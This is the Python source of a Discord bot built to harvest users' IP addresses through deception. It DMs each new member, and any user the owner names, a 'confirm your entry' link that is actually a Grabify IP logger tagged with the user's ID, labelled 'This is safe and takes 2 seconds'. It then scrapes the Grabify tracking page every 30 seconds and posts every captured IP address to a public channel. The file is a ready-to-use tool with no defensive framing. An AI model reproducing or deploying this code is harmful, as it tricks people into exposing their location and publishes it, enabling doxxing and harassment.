import discord
from discord.ext import commands, tasks
import os
import datetime
import requests
import re

# ========================================
# 1. CONFIGURATION
# ========================================
TOKEN = os.getenv('DISCORD_TOKEN')
YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))

# YOUR GRABIFY LINK
GRABIFY_LINK = "https://grabify.link/AC6BBB"  # ← REPLACE WITH YOUR LINK!

# EXTRACT TRACKING CODE FROM LINK
TRACKING_CODE = GRABIFY_LINK.replace("https://grabify.link/", "")

# CHANNEL ID FOR PUBLIC LOGS
LOG_CHANNEL_ID = 1541000634210324510  # ← REPLACE WITH YOUR CHANNEL ID!

# ========================================
# 2. BOT
# ========================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Store data
user_links = {}
known_ips = {}  # Store already sent IPs

def get_grabify_data():
    """Get all IPs from Grabify page"""
    try:
        url = f"https://grabify.link/track/{TRACKING_CODE}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code != 200:
            print(f"❌ Grabify error: {response.status_code}")
            return None
        
        html = response.text
        
        # Pattern for IP address
        ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
        
        # Find all IPs
        found_ips = re.findall(ip_pattern, html)
        
        # Remove duplicates
        unique_ips = list(set(found_ips))
        
        if unique_ips:
            return [{'ip': ip, 'time': datetime.datetime.now().isoformat()} for ip in unique_ips]
        else:
            return None
            
    except Exception as e:
        print(f"❌ Error getting Grabify data: {e}")
        return None

@tasks.loop(seconds=30)  # Check every 30 seconds
async def check_grabify():
    """Check Grabify for new IPs"""
    global known_ips
    
    print("🔍 Checking Grabify for new IPs...")
    
    ips = get_grabify_data()
    if not ips:
        return
    
    # Check for new IPs
    for ip_data in ips:
        ip = ip_data['ip']
        if ip not in known_ips:
            known_ips[ip] = ip_data
            
            # Send to channel
            channel = bot.get_channel(LOG_CHANNEL_ID)
            if channel:
                embed = discord.Embed(
                    title="🕵️ NEW IP DETECTED!",
                    description=f"New visitor clicked the link!",
                    color=discord.Color.green(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="🌐 IP Address", value=f"`{ip}`", inline=True)
                embed.add_field(name="📅 Time", value=datetime.datetime.now().strftime("%H:%M:%S"), inline=True)
                embed.set_footer(text="Collected via Grabify")
                
                await channel.send(embed=embed)
                print(f"📢 Published new IP: {ip}")

@bot.event
async def on_ready():
    print(f'✅ Bot {bot.user} is online!')
    print(f'📊 Connected to {len(bot.guilds)} servers')
    print(f'🔗 Grabify link: {GRABIFY_LINK}')
    print(f'📡 Tracking code: {TRACKING_CODE}')
    print(f'📢 Log channel: {LOG_CHANNEL_ID}')
    
    # Start checking Grabify
    check_grabify.start()
    print('🔄 Started checking Grabify for new IPs...')

@bot.event
async def on_member_join(member):
    """When a new member joins the server"""
    try:
        user_id = str(member.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        embed = discord.Embed(
            title="🎉 Welcome to the server!",
            description=f"Hello {member.mention}! Please confirm your entry.",
            color=discord.Color.blue()
        )
        embed.add_field(
            name="🔗 Confirm entry",
            value=f"[Click here]({tracking_link})",
            inline=False
        )
        embed.set_footer(text="This is safe and takes 2 seconds")
        
        await member.send(embed=embed)
        print(f"📨 Sent link to {member.name}")
        
    except Exception as e:
        print(f"❌ Error: {e}")

@bot.event
async def on_voice_state_update(member, before, after):
    """When someone joins a voice channel"""
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        try:
            # Just log to console, no DM spam
            print(f"🔊 {member.name} joined {after.channel.name}")
            
        except Exception as e:
            print(f"❌ Error: {e}")

@bot.command(name='force_check')
async def force_check(ctx):
    """Manually check Grabify for new IPs"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner!")
        return
    
    await ctx.send("🔍 Checking Grabify...")
    await check_grabify()
    await ctx.send("✅ Check completed! Check the channel for new IPs.")

@bot.command(name='ips')
async def list_ips(ctx):
    """Show collected IPs"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner!")
        return
    
    if not known_ips:
        await ctx.send("📊 No IPs collected yet")
        return
    
    embed = discord.Embed(
        title="📊 Collected IPs",
        color=discord.Color.blue()
    )
    
    desc = ""
    for ip, data in list(known_ips.items())[:10]:
        desc += f"🌐 `{ip}`\n"
    
    embed.description = desc[:4096] if desc else "No IPs"
    embed.add_field(name="📊 Total", value=len(known_ips), inline=True)
    await ctx.send(embed=embed)

@bot.command(name='clear_ips')
async def clear_ips(ctx):
    """Clear collected IPs"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner!")
        return
    
    known_ips.clear()
    await ctx.send("✅ All IPs cleared!")

@bot.command(name='send_link')
async def send_link(ctx, user: discord.Member = None):
    """Send link to a specific user"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner!")
        return
    
    if user is None:
        await ctx.send("❌ Specify user: `!send_link @user`")
        return
    
    try:
        user_id = str(user.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        embed = discord.Embed(
            title="🔔 Confirm entry",
            description=f"{user.mention}, please confirm your entry.",
            color=discord.Color.blue()
        )
        embed.add_field(name="🔗 Link", value=f"[Click here]({tracking_link})", inline=False)
        
        await user.send(embed=embed)
        await ctx.send(f"✅ Link sent to {user.name} in DM!")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='link')
async def show_link(ctx):
    """Show Grabify link"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner!")
        return
    
    embed = discord.Embed(
        title="📊 Grabify Link",
        description="Go here to see collected IPs",
        color=discord.Color.green()
    )
    embed.add_field(name="🔗 Link", value=f"```\n{GRABIFY_LINK}\n```", inline=False)
    embed.add_field(name="👥 Tracking", value=f"{len(user_links)} users", inline=False)
    await ctx.send(embed=embed)

# ========================================
# 3. RUN
# ========================================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ERROR: DISCORD_TOKEN not found!")
        exit(1)
    
    if LOG_CHANNEL_ID == 123456789012345678:
        print("⚠️ WARNING: Replace LOG_CHANNEL_ID with your channel ID!")
    
    bot.run(TOKEN)
